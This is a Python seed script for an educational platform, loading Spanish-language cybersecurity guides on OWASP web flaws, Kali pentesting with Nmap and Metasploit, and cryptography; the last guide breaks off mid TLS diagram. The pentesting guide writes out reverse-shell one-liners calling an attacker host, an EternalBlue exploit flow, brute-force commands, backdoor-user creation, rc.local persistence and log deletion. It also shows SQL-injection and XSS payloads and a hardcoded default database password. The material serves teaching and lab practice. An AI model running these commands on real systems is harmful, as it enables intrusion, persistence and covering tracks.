"""
seed_teoria_ciberseguridad.py
═══════════════════════════════════════════════════════════════════════════════
Inserta la materia "Ciberseguridad" con 5 guías completas de teoría:

  1. Guía completa: OWASP Top 10 y Seguridad Web
  2. Guía completa: Kali Linux y Pentesting con Nmap y Metasploit
  3. Guía completa: Criptografía Aplicada
  4. Guía completa: Firewall, iptables y Seguridad de Red en Linux
  5. Guía completa: Análisis Forense Digital y Logs

Uso:
    cd /path/to/backend
    source venv/bin/activate
    python scripts/seed_teoria_ciberseguridad.py

═══════════════════════════════════════════════════════════════════════════════
"""

import os, sys
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from dotenv import load_dotenv
load_dotenv()

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://tech4u_admin:tech4u_admin@localhost:5432/tech4u")
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)


# ─── Guía 1: OWASP Top 10 ─────────────────────────────────────────────────────

OWASP_TOP_10_CONTENT = """# Guía completa: OWASP Top 10 y Seguridad Web

## Introducción

El OWASP Top 10 es una lista de las 10 vulnerabilidades web más críticas y peligrosas. Publicado regularmente por la comunidad OWASP (Open Web Application Security Project), esta lista es esencial para desarrolladores, pentestadores y profesionales de ciberseguridad. La versión 2021 incluye vulnerabilidades como control de acceso roto, fallos criptográficos e inyección de código.

Como estudiante de FP en ASIR/DAW/DAM, comprender estas vulnerabilidades es fundamental para construir y defender aplicaciones web seguras. Esta guía te proporciona ejemplos prácticos, técnicas de prueba y remediación para cada vulnerabilidad.

## A01: Broken Access Control (Control de Acceso Roto)

El control de acceso es el mecanismo que permite que solo usuarios autorizados accedan a recursos específicos. Cuando está roto, usuarios no autorizados pueden acceder a datos o funcionalidades que no deberían.

### Ejemplos Comunes

**Acceso directo a objetos sin protección:**

```python
# ❌ VULNERABLE
@app.route('/user/<user_id>/profile')
def get_profile(user_id):
    user = User.query.get(user_id)
    return jsonify(user.data)

# Si accedo a /user/2/profile y soy el usuario 1, accedo al perfil de otro sin validación
```

**Remediación:**

```python
# ✅ SEGURO
from flask_login import current_user, login_required

@app.route('/user/<user_id>/profile')
@login_required
def get_profile(user_id):
    if int(user_id) != current_user.id:
        return jsonify({"error": "Unauthorized"}), 403
    user = User.query.get(user_id)
    return jsonify(user.data)
```

### Testeo con Burp Suite

1. Abre Burp Suite Community Edition
2. Configura el navegador para usar Burp como proxy
3. Navega a la aplicación web vulnerable
4. Intenta acceder a `/user/2/profile` directamente
5. Modifica el parámetro `user_id` en el Repeater
6. Observa si accedes a datos de otros usuarios

### Técnicas de Remediación

- Implementar verificación de autorización en CADA endpoint
- Usar roles y permisos (RBAC - Role Based Access Control)
- Validar que el usuario actual tenga acceso al recurso solicitado
- Usar tokens JWT con claims de autorización
- Implementar políticas de acceso basadas en atributos (ABAC)

---

## A02: Cryptographic Failures (Fallos Criptográficos)

Los fallos criptográficos ocurren cuando los datos sensibles se transmiten o almacenan de manera insegura. Incluye uso de algoritmos débiles, falta de encriptación o gestión pobre de claves.

### Ejemplos Vulnerables

**Contraseñas almacenadas en texto plano:**

```python
# ❌ VULNERABLE
user = User(username="admin", password="securepassword123")
db.session.add(user)
db.session.commit()
```

**Transmisión sin encriptación (HTTP):**

```
GET /login?username=admin&password=pass123 HTTP/1.1
Host: vulnerable-site.com
```

### Remediación Correcta

**Usar bcrypt o Argon2 para hashing de contraseñas:**

```python
# ✅ SEGURO
from werkzeug.security import generate_password_hash, check_password_hash

password_hash = generate_password_hash("securepassword123", method='pbkdf2:sha256')
user = User(username="admin", password_hash=password_hash)
db.session.add(user)
db.session.commit()

# Verificar contraseña
if check_password_hash(user.password_hash, "securepassword123"):
    print("Contraseña correcta")
```

**Usar HTTPS obligatorio:**

```python
# En Flask, configurar HTTPS
from flask_talisman import Talisman

Talisman(app, force_https=True)
```

### Algoritmos Criptográficos Seguros

| Tipo | Algoritmo Seguro | Algoritmo Débil |
|------|------------------|-----------------|
| Hash | SHA-256, SHA-512 | MD5, SHA-1 |
| Contraseñas | bcrypt, Argon2 | SHA-256 simple |
| Encriptación Simétrica | AES-256 | DES, 3DES |
| Encriptación Asimétrica | RSA-2048+, ECC | RSA-512 |
| HMAC | SHA-256, SHA-512 | MD5 |

---

## A03: Injection (Inyección)

La inyección permite que un atacante inserte código malicioso en la aplicación. Los tipos más comunes son SQL Injection y Cross-Site Scripting (XSS).

### SQL Injection

**Ejemplo vulnerable:**

```python
# ❌ VULNERABLE
username = request.form['username']
query = f"SELECT * FROM users WHERE username = '{username}'"
result = db.execute(query)
```

Un atacante podría enviar: `' OR '1'='1`

Resultando en: `SELECT * FROM users WHERE username = '' OR '1'='1'` → Retorna TODOS los usuarios

**Remediación con Prepared Statements:**

```python
# ✅ SEGURO
username = request.form['username']
query = "SELECT * FROM users WHERE username = ?"
result = db.execute(query, (username,))
```

### Cross-Site Scripting (XSS)

**XSS Reflected (vulnerable):**

```python
# ❌ VULNERABLE
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Resultados para: {query}</h1>"

# Atacante envía: /search?q=<script>alert('XSS')</script>
# El script se ejecuta en el navegador del usuario
```

**XSS Stored (vulnerable):**

```python
# ❌ VULNERABLE - Usuario A publica comentario con script malicioso
comment = "<img src=x onerror='alert(\"XSS\")'>"
db.session.add(Comment(text=comment))

# Usuario B lee el comentario y el script se ejecuta
```

**Remediación:**

```python
# ✅ SEGURO - Escaping automático en templates
from flask import render_template_string
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q')
    return render_template_string("<h1>Resultados para: {{ query }}</h1>", query=query)
    # Jinja2 escapa automáticamente el contenido

# O con escape manual
return f"<h1>Resultados para: {escape(query)}</h1>"
```

### Testeo de Inyecciones con OWASP ZAP

1. Descarga OWASP ZAP
2. Configura como proxy
3. Navega la aplicación
4. Ve a Automated Scan
5. ZAP intentará inyecciones automáticas
6. Revisa los reportes generados

---

## A04: Insecure Design (Diseño Inseguro)

El diseño inseguro se refiere a la falta de modelos, patrones y controles de seguridad en la arquitectura de la aplicación.

### Problemas Comunes

- No implementar autenticación multi-factor (MFA)
- Falta de rate limiting en endpoints críticos
- Gestión de sesiones débil
- Recuperación de contraseña insegura

### Ejemplo: Recuperación de Contraseña Insegura

```python
# ❌ VULNERABLE - Preguntas de seguridad débiles
@app.route('/reset-password', methods=['POST'])
def reset_password():
    username = request.form['username']
    answer = request.form['security_answer']

    user = User.query.filter_by(username=username).first()
    if user and user.security_answer == answer:  # Comparación sin hash
        user.password = request.form['new_password']
        db.session.commit()
        return "Contraseña restablecida"
```

**Problemas:**
- Preguntas de seguridad adivinables
- Tokens sin expiración
- Verificación sin rate limiting (ataque de fuerza bruta)

**Remediación:**

```python
# ✅ SEGURO
from secrets import token_urlsafe
from datetime import timedelta

@app.route('/reset-password-request', methods=['POST'])
def reset_password_request():
    email = request.form['email']
    user = User.query.filter_by(email=email).first()

    if user:
        reset_token = token_urlsafe(32)
        user.reset_token = reset_token
        user.reset_token_expiry = datetime.utcnow() + timedelta(hours=1)
        db.session.commit()

        # Enviar email con enlace
        send_reset_email(user.email, reset_token)

    return "Si el email existe, recibirás instrucciones"

@app.route('/reset-password/<token>', methods=['POST'])
def reset_password_with_token(token):
    user = User.query.filter_by(reset_token=token).first()

    if not user or user.reset_token_expiry < datetime.utcnow():
        return "Token inválido o expirado", 400

    user.password_hash = generate_password_hash(request.form['new_password'])
    user.reset_token = None
    user.reset_token_expiry = None
    db.session.commit()
    return "Contraseña restablecida exitosamente"
```

---

## A05: Security Misconfiguration (Configuración Insegura)

Incluye componentes sin usar habilitados, cuentas por defecto activas, error handling que expone información sensible, etc.

### Problemas Comunes

```
❌ Servidores web con módulos no necesarios activados
❌ Consolas de administración accesibles públicamente
❌ Credenciales por defecto sin cambiar (admin:admin)
❌ Stack traces completos en páginas de error
❌ Headers de seguridad faltantes
```

### Remediación

```python
# ✅ SEGURO - Configuración hardeneada
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)

# Headers de seguridad
Talisman(app,
    force_https=True,
    strict_transport_security=True,
    strict_transport_security_max_age=31536000,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self' 'unsafe-inline'",
        'style-src': "'self' 'unsafe-inline'",
    }
)

# No exponer stack traces
@app.errorhandler(500)
def internal_error(error):
    return {"error": "Error interno del servidor"}, 500

# CORS seguro
from flask_cors import CORS
CORS(app, resources={r"/api/*": {"origins": "https://trusted-domain.com"}})
```

---

## A07: Authentication Failures (Fallos de Autenticación)

Incluye contraseñas débiles, sesiones sin protección y falta de multi-factor authentication.

### Implementación Segura de Autenticación

```python
# ✅ SEGURO - Con rate limiting y MFA
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # Rate limiting: 5 intentos por minuto
def login():
    username = request.form['username']
    password = request.form['password']

    user = User.query.filter_by(username=username).first()
    if user and check_password_hash(user.password_hash, password):
        # MFA - generar código TOTP
        if user.mfa_enabled:
            mfa_token = generate_mfa_token(user)
            return jsonify({"status": "MFA_REQUIRED", "temp_token": mfa_token}), 202

        # Login exitoso
        session['user_id'] = user.id
        session.permanent = True
        session.permanent_lifetime = 1800  # 30 minutos
        return jsonify({"status": "success"}), 200

    return jsonify({"error": "Invalid credentials"}), 401

@app.route('/verify-mfa', methods=['POST'])
@limiter.limit("3 per minute")
def verify_mfa():
    temp_token = request.form['temp_token']
    mfa_code = request.form['code']

    user = verify_mfa_token(temp_token, mfa_code)
    if user:
        session['user_id'] = user.id
        return jsonify({"status": "success"}), 200

    return jsonify({"error": "Invalid MFA code"}), 401
```

---

## A09: Logging and Monitoring Failures (Fallos de Logging)

La falta de registro y monitoreo permite que los atacantes operen sin ser detectados.

### Implementación de Logging Seguro

```python
# ✅ SEGURO - Logging completo de eventos críticos
import logging
from datetime import datetime

logging.basicConfig(
    filename='/var/log/app_security.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    ip_address = request.remote_addr

    user = User.query.filter_by(username=username).first()

    if user and check_password_hash(user.password_hash, request.form['password']):
        logging.info(f"Login exitoso - Usuario: {username}, IP: {ip_address}")
        session['user_id'] = user.id
        return jsonify({"status": "success"}), 200
    else:
        logging.warning(f"Login fallido - Usuario: {username}, IP: {ip_address}")
        return jsonify({"error": "Invalid credentials"}), 401

@app.route('/admin/delete-user/<user_id>', methods=['POST'])
@admin_required
def delete_user(user_id):
    user = User.query.get(user_id)
    admin_id = session.get('user_id')

    logging.critical(f"Usuario eliminado - ID: {user_id}, Eliminado por: {admin_id}, Hora: {datetime.utcnow()}")
    db.session.delete(user)
    db.session.commit()

    return jsonify({"status": "success"}), 200
```

### Eventos Críticos a Registrar

| Evento | Información |
|--------|-------------|
| Login fallido | Usuario, IP, fecha/hora |
| Login exitoso | Usuario, IP, fecha/hora |
| Cambio de contraseña | Usuario, admin (si aplica), fecha |
| Cambio de permisos | Usuario, nuevos permisos, admin, fecha |
| Acceso a datos sensibles | Usuario, recurso, fecha, IP |
| Eliminación de datos | Usuario, ID de dato, admin, fecha |
| Fallo de autenticación MFA | Usuario, IP, fecha, número de intentos |

---

## Herramientas de Testing Esenciales

### Burp Suite Community Edition

```
1. Descarga: https://portswigger.net/burp
2. Abre Burp
3. Ve a Proxy → Options
4. Configura puerto (ej: 8080)
5. Configura navegador proxy a localhost:8080
6. Navega por la app objetivo
7. Usa Scanner automático o pruebas manuales en Repeater
```

### OWASP ZAP (Alternativa Open Source)

```bash
# En Kali Linux o Linux en general
sudo apt install zaproxy

# Ejecutar ZAP
zaproxy

# O usar desde CLI para escaneos automáticos
zaproxy -cmd -quickurl http://target.com -quickout report.html
```

### Testeo Manual de Inyección SQL

```bash
# Desde la terminal, usando curl
curl "http://vulnerable-site.com/search?q=test' OR '1'='1"

# Resultado: Si retorna datos anómalos, es vulnerable
```

---

## Checklist de Seguridad Web

- [ ] Usar HTTPS en toda la aplicación
- [ ] Implementar CSRF tokens en formularios
- [ ] Validar y sanitizar TODAS las entradas
- [ ] Usar prepared statements para queries SQL
- [ ] Implementar rate limiting en endpoints críticos
- [ ] Hashear contraseñas con bcrypt/Argon2
- [ ] Implementar autenticación multi-factor
- [ ] Configurar headers de seguridad (CSP, X-Frame-Options, etc)
- [ ] Implementar logging completo de eventos críticos
- [ ] Realizar penetrating testing regularmente
- [ ] Usar herramientas de análisis estático (SAST)
- [ ] Mantener dependencias actualizadas

---

## Recursos Adicionales

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Academy: https://portswigger.net/web-security
- DVWA (Damn Vulnerable Web Application): Laboratorio para practicar
- WebGoat: Aplicación vulnerable para aprender
"""

# ─── Guía 2: Kali Linux y Pentesting ───────────────────────────────────────

KALI_PENTESTING_CONTENT = """# Guía completa: Kali Linux y Pentesting con Nmap y Metasploit

## Introducción

Kali Linux es una distribución de Linux especializada en pentesting y auditoría de seguridad, preinstalada con herramientas como Nmap, Metasploit, Burp Suite, Wireshark y cientos más. Para profesionales de ciberseguridad en FP ASIR/DAW/DAM/SMR, dominar estas herramientas es esencial.

Esta guía te enseña las fases de un pentesting profesional y cómo usar las herramientas principales.

## Fases del Pentesting Profesional

### 1. Reconnaissance (Reconocimiento)

La fase de recopilación pasiva de información sin interactuar directamente con el objetivo.

**Técnicas:**

```bash
# Búsqueda WHOIS - información del dominio
whois google.com

# Búsqueda DNS
nslookup google.com
dig google.com

# Búsqueda de subdominios
# Usando herramientas como sublist3r
sublist3r -d google.com

# Google Dorking (búsqueda avanzada en Google)
site:google.com filetype:pdf
site:google.com inurl:admin
site:google.com "password"
```

---

### 2. Scanning (Escaneo)

Identificar hosts activos y puertos abiertos. Aquí usaremos **Nmap**.

## Nmap - Network Mapper

### Instalación

```bash
sudo apt update
sudo apt install nmap
nmap --version
```

### Tipos de Escaneo

**Escaneo básico - Puertos abiertos más comunes:**

```bash
nmap 192.168.1.100
# Escanea los 1000 puertos más comunes por defecto
```

**Especificar puertos:**

```bash
# Un puerto específico
nmap -p 22 192.168.1.100

# Rango de puertos
nmap -p 20-443 192.168.1.100

# Todos los puertos
nmap -p- 192.168.1.100  # Toma más tiempo (65535 puertos)

# Puertos específicos
nmap -p 22,80,443,3306 192.168.1.100
```

### Flags Esenciales de Nmap

| Flag | Descripción | Ejemplo |
|------|-------------|---------|
| `-sV` | Detectar versiones de servicios | `nmap -sV 192.168.1.100` |
| `-sC` | Usar scripts por defecto | `nmap -sC 192.168.1.100` |
| `-O` | Detectar SO (OS fingerprinting) | `nmap -O 192.168.1.100` |
| `-p` | Especificar puertos | `nmap -p 80,443 192.168.1.100` |
| `-A` | Agresivo (versión, SO, scripts) | `nmap -A 192.168.1.100` |
| `-T4` | Velocidad (T0-T5) | `nmap -T4 192.168.1.100` |
| `--script` | Ejecutar scripts específicos | `nmap --script vuln 192.168.1.100` |
| `-iL` | Leer hosts de archivo | `nmap -iL targets.txt` |
| `-oN` | Output normal | `nmap -oN output.txt 192.168.1.100` |
| `-oX` | Output XML | `nmap -oX output.xml 192.168.1.100` |

### Ejemplos Prácticos de Nmap

**Escaneo completo de un objetivo:**

```bash
sudo nmap -A -T4 -p- --script=vuln 192.168.1.100 -oN scan_results.txt
```

Esto:
- `-A`: Modo agresivo (versión, SO, scripts)
- `-T4`: Velocidad 4 (bastante rápido)
- `-p-`: Escanea todos los puertos
- `--script=vuln`: Ejecuta scripts de vulnerabilidades
- `-oN`: Guarda output en archivo texto

**Escaneo de vulnerabilidades web comunes:**

```bash
nmap --script http-vuln-* -p 80,443 192.168.1.100
```

**Escaneo sigiloso (más lento pero menos detectable):**

```bash
sudo nmap -sS -T1 192.168.1.100
# -sS: TCP SYN scan (half-open)
# -T1: Timing muy lento
```

**Escaneo de red completa:**

```bash
nmap 192.168.1.0/24
# Escanea toda la subred /24 (256 IPs)
```

---

## Metasploit Framework

Metasploit es un framework completo de explotación. El núcleo es **msfconsole**.

### Instalación en Kali Linux

```bash
# Ya viene preinstalado en Kali
# Actualizar base de datos
sudo msfdb init
msfconsole
```

### Estructura Básica de Metasploit

| Componente | Descripción |
|-----------|-------------|
| Exploits | Código que aprovecha vulnerabilidades |
| Payloads | Código que se ejecuta después del exploit |
| Encoders | Codifican payloads para evitar detección |
| Listeners | Escuchan conexiones de payloads ejecutados |
| Auxiliary | Herramientas auxiliares (scaneo, fuzzing) |

### Comandos Esenciales de msfconsole

```bash
# Iniciar msfconsole
msfconsole

# Dentro de msfconsole:

# Buscar exploits
search apache 2.4
search type:exploit platform:windows

# Usar un exploit
use exploit/windows/smb/ms17_010_eternalblue
# o
use exploit/multi/http/apache_tomcat_cgi_rce

# Ver opciones del exploit
show options

# Configurar parámetros
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50   # Tu IP (atacante)
set LPORT 4444           # Puerto para reverse shell
set PAYLOAD windows/meterpreter/reverse_tcp

# Listar payloads disponibles
show payloads

# Ejecutar exploit
run
# o
exploit

# Sesiones activas
sessions
sessions -i 1  # Interactuar con sesión 1

# Salir
exit
```

### Flujo Típico de Explotación

```bash
# 1. Buscar exploit para EternalBlue (Windows XP-7)
search eternalblue

# 2. Usar el exploit
use exploit/windows/smb/ms17_010_eternalblue

# 3. Configurar objetivo
set RHOSTS 192.168.1.100

# 4. Elegir payload (reverse shell)
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# 5. Ejecutar
run

# 6. Interactuar con shell
sessions -i 1
getuid
whoami
sysinfo
```

### Meterpreter - Shell Interactivo

Una vez ejecutado un exploit con Meterpreter:

```
meterpreter > help           # Ver comandos disponibles
meterpreter > sysinfo        # Información del sistema
meterpreter > ipconfig       # Configuración de red
meterpreter > getuid         # Usuario actual
meterpreter > ps             # Lista de procesos
meterpreter > migrate <PID>  # Migrar a otro proceso
meterpreter > hashdump       # Dumping de contraseñas (Windows)
meterpreter > download C:\\passwords.txt /root/  # Descargar archivo
meterpreter > upload /root/malware.exe C:\\     # Subir archivo
meterpreter > shell          # Shell de comando
```

---

## Herramientas Auxiliares Esenciales

### Netcat (nc)

Herramienta versátil para crear conexiones de red.

```bash
# Reverse shell - desde servidor comprometido conectarse a atacante
nc -e /bin/sh 192.168.1.50 4444

# En el atacante - escuchar
nc -nlvp 4444

# Bind shell - servidor escucha en puerto
nc -nlvp 4444 -e /bin/sh

# Cliente conecta
nc 192.168.1.100 4444

# Transferencia de archivos
# Servidor (origen)
nc -nlvp 4444 < archivo.tar.gz

# Cliente (destino)
nc 192.168.1.50 4444 > archivo.tar.gz

# Verificar conectividad
nc -zv 192.168.1.100 80
```

### Gobuster - Fuzzing de Directorios Web

```bash
sudo apt install gobuster

# Fuzzing básico
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# Con extensiones
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.txt

# Búsqueda de subdominios
gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt
```

### Hydra - Ataque de Fuerza Bruta

```bash
# Ataque SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh

# Ataque HTTP POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed"

# Ataque FTP
hydra -L users.txt -P passwords.txt 192.168.1.100 ftp

# Con múltiples threads
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 192.168.1.100 ssh
```

---

## 3. Exploitation (Explotación)

Una vez identificadas vulnerabilidades, usar Metasploit o exploits manuales.

```bash
# Explotar vulnerabilidad en servidor web
msfconsole
search tomcat
use exploit/multi/http/apache_tomcat_cgi_rce
set RHOSTS 192.168.1.100
set RPORT 8080
run

# Spawn reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.50",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## 4. Post-Exploitation (Post-Explotación)

Después de comprometer un sistema, recopilar información y establecer persistencia.

```bash
# Enumeration
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow (si eres root)

# Escalado de privilegios
sudo -l
find / -perm -4000 2>/dev/null  # SUID binaries

# Crear usuario backdoor
useradd -m backdoor
echo "backdoor:password123" | chpasswd

# Establecer reverse shell permanente
echo "nc -e /bin/sh attacker_ip 4444" >> /etc/rc.local

# Limpiar logs
history -c
cat /dev/null > ~/.bash_history
rm -rf /var/log/auth.log
```

---

## 5. Reporting (Reporte)

Documentar hallazgos en reporte profesional.

### Estructura de Reporte de Pentesting

1. **Executive Summary** - Resumen ejecutivo
2. **Methodology** - Metodología usada
3. **Findings** - Vulnerabilidades encontradas (crítica, alta, media, baja)
4. **Evidence** - Pruebas (screenshots, logs)
5. **Recommendations** - Recomendaciones de remediación
6. **Appendix** - Datos técnicos detallados

---

## Laboratorio Práctica: Vulnerable VM

Descarga máquinas vulnerables para practicar:

- **Metasploitable 2**: Versión antigua vulnerable de Linux
- **DVWA**: Aplicación web vulnerable
- **HackTheBox**: Máquinas de CTF online
- **TryHackMe**: Laboratorios guiados

```bash
# Descargar Metasploitable
# https://sourceforge.net/projects/metasploitable/

# En VirtualBox, importar OVA y conectar a misma red que Kali
```

---

## Checklist de Pentesting

- [ ] Reconnaissance completo del objetivo
- [ ] Nmap scan exhaustivo con -A y scripts
- [ ] Identificar versiones de servicios
- [ ] Búsqueda de CVEs en cada versión
- [ ] Probar exploits en Metasploit
- [ ] Documentar todos los hallazgos
- [ ] Escalado de privilegios en sistemas comprometidos
- [ ] Post-exploitation y persistencia
- [ ] Limpiar rastros de ataque
- [ ] Generar reporte detallado

---

## Herramientas Adicionales de Kali

| Herramienta | Uso |
|-------------|-----|
| Wireshark | Análisis de tráfico de red |
| Burp Suite | Testing de aplicaciones web |
| John the Ripper | Cracking de contraseñas |
| Aircrack-ng | Auditoría de redes inalámbricas |
| SQL Map | Detección de SQL injection automática |
| SSLyze | Análisis de configuración SSL/TLS |
| Nikto | Scanner web |
| Hashcat | GPU-accelerated password cracking |
"""

# ─── Guía 3: Criptografía Aplicada ────────────────────────────────────────

CRIPTOGRAFIA_CONTENT = """# Guía completa: Criptografía Aplicada

## Introducción

La criptografía es la ciencia de cifrar información para protegerla de acceso no autorizado. En ciberseguridad moderna, comprender los algoritmos criptográficos es fundamental. Esta guía cubre cifrado simétrico, asimétrico, funciones hash, PKI y herramientas prácticas como OpenSSL.

## Cifrado Simétrico

El cifrado simétrico usa la misma clave para cifrar y descifrar. Es rápido pero requiere compartir la clave de forma segura.

### AES-256 (Advanced Encryption Standard)

AES es el estándar de encriptación del US NIST. AES-256 usa claves de 256 bits (prácticamente irrompible con tecnología actual).

**Con Python:**

```python
from cryptography.fernet import Fernet

# Generar clave
key = Fernet.generate_key()
cipher = Fernet(key)

# Cifrar
plaintext = "Mi contraseña secreta"
ciphertext = cipher.encrypt(plaintext.encode())

print(f"Cifrado: {ciphertext}")

# Descifrar
decrypted = cipher.decrypt(ciphertext).decode()
print(f"Descifrado: {decrypted}")
```

**Con OpenSSL (CLI):**

```bash
# Generar clave aleatoria de 256 bits
openssl rand -hex 32

# Cifrar con AES-256-CBC
openssl enc -aes-256-cbc -in plaintext.txt -out ciphertext.enc -K <KEY> -iv <IV>

# Descifrar
openssl enc -d -aes-256-cbc -in ciphertext.enc -K <KEY> -iv <IV>

# O con contraseña (salt automático)
openssl enc -aes-256-cbc -in plaintext.txt -out ciphertext.enc -S 0x12345678 -P

# Descifrar con contraseña
openssl enc -d -aes-256-cbc -in ciphertext.enc
```

### Algoritmos Simétricos

| Algoritmo | Tamaño de Clave | Bloques | Seguridad | Notas |
|-----------|-----------------|---------|-----------|-------|
| DES | 56 bits | 64 bits | ❌ Obsoleto | Roto desde 1998 |
| 3DES | 168 bits | 64 bits | ⚠️ Débil | Triple DES, legado |
| AES-128 | 128 bits | 128 bits | ✅ Fuerte | Recomendado |
| AES-192 | 192 bits | 128 bits | ✅ Muy fuerte | Pocas aplicaciones |
| AES-256 | 256 bits | 128 bits | ✅ Máxima | Estándar militar |
| ChaCha20 | 256 bits | Stream | ✅ Moderno | Rápido, mobile |

---

## Cifrado Asimétrico (Clave Pública)

El cifrado asimétrico usa un par de claves: pública (para cifrar) y privada (para descifrar). Permite comunicación segura sin compartir claves previamente.

### RSA (Rivest-Shamir-Adleman)

**Conceptos:**
- Clave pública: compartida, para cifrar
- Clave privada: secreta, para descifrar
- RSA-2048 es actualmente seguro
- RSA-4096 es más seguro pero más lento

**Generar claves RSA con OpenSSL:**

```bash
# Generar clave privada de 2048 bits
openssl genrsa -out private.key 2048

# Extraer clave pública de la privada
openssl rsa -in private.key -pubout -out public.key

# Ver contenido de claves
openssl rsa -in private.key -text -noout
openssl rsa -in public.key -pubin -text -noout
```

**Cifrar y Descifrar con RSA (Python):**

```python
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# Generar claves
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Mensaje
message = b"Mensaje secreto"

# Cifrar con clave pública
ciphertext = public_key.encrypt(
    message,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Descifrar con clave privada
plaintext = private_key.decrypt(
    ciphertext,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

print(f"Descifrado: {plaintext}")
```

---

## Funciones Hash (Resumen Criptográfico)

Las funciones hash son unidireccionales: convierten datos de cualquier tamaño en un valor fijo. No se puede revertir, pero detectan cambios.

### Hash Criptográficos

| Algoritmo | Longitud | Seguridad | Uso |
|-----------|----------|-----------|-----|
| MD5 | 128 bits | ❌ Roto | NO USAR |
| SHA-1 | 160 bits | ❌ Débil | Legado solamente |
| SHA-256 | 256 bits | ✅ Fuerte | Blockchain, certificados |
| SHA-512 | 512 bits | ✅ Muy fuerte | Almacenamiento seguro |
| SHA-3 | Variable | ✅ Nuevo estándar | Futuro |
| BLAKE2 | 256/512 bits | ✅ Moderno | Velocidad + seguridad |

**Hash con OpenSSL:**

```bash
# SHA-256
echo -n "mensaje" | openssl dgst -sha256

# SHA-512
echo -n "mensaje" | openssl dgst -sha512

# Hashear archivo
sha256sum archivo.txt
sha512sum archivo.txt
```

**Hash con Python:**

```python
import hashlib

message = "Mi contraseña"

# SHA-256
hash_obj = hashlib.sha256(message.encode())
hash_hex = hash_obj.hexdigest()
print(f"SHA-256: {hash_hex}")

# SHA-512
hash_obj = hashlib.sha512(message.encode())
print(f"SHA-512: {hash_obj.hexdigest()}")
```

### Almacenamiento Seguro de Contraseñas

NUNCA usar SHA-256 simple. Usar algoritmos con salt y stretching:

**bcrypt (Mejor):**

```python
import bcrypt

password = "MyPassword123"

# Hash (con salt automático)
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# Verificar
if bcrypt.checkpw(password.encode(), hashed):
    print("Contraseña correcta")
else:
    print("Contraseña incorrecta")
```

**Argon2 (Más moderno):**

```python
from argon2 import PasswordHasher

ph = PasswordHasher()

password = "MyPassword123"

# Hash
hash = ph.hash(password)

# Verificar
try:
    ph.verify(hash, password)
    print("Contraseña correcta")
except:
    print("Contraseña incorrecta")
```

---

## PKI (Public Key Infrastructure) y Certificados X.509

PKI es un sistema para gestionar certificados digitales que atestiguan la identidad.

### Estructura de Certificado X.509

```
Certificate:
    Version: 3 (0x2)
    Serial Number: 1234567890
    Signature Algorithm: sha256WithRSAEncryption
    Issuer: C=ES, O=MiEmpresa, CN=Mi CA
    Validity
        Not Before: Jan 1 00:00:00 2024 GMT
        Not After: Dec 31 23:59:59 2024 GMT
    Subject: C=ES, O=MiEmpresa, CN=www.miempresa.es
    Public Key:
        RSA Public-Key: (2048 bit)
    X509v3 extensions:
        X509v3 Subject Alternative Name:
            DNS:www.miempresa.es, DNS:miempresa.es
```

### Generar Certificado Auto-Firmado (Self-Signed)

```bash
# Generar clave privada y certificado en un comando
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# Interactivo:
# Country Name: ES
# State: Madrid
# Locality: Madrid
# Organization: MiEmpresa
# Common Name: www.miempresa.es

# Ver certificado
openssl x509 -in cert.pem -text -noout
```

### Crear CA (Certification Authority) Propia

```bash
# 1. Generar clave privada de la CA
openssl genrsa -out ca.key 4096

# 2. Crear certificado de la CA
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt

# 3. Generar CSR (Certificate Signing Request) para servidor
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr

# 4. Firmar CSR con la CA
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 365

# 5. Ver certificado firmado
openssl x509 -in server.crt -text -noout
```

---

## TLS/HTTPS Handshake (Protocolo SSL/TLS)

El handshake TLS es el proceso de establecer una conexión encriptada.

### Proceso Paso a Paso (TLS 1.3)

```
Cliente                                 Servidor
  |                                        |
  |------ ClientHello (ciphers, curves)-->|
  |                                        |
  |<----- ServerHello (cipher elegido) ----|
  |<----- Certificate (cert del servidor)-|
  |<----- ServerKeyExchange -------------|
  |<----- ServerHelloDone             ---|
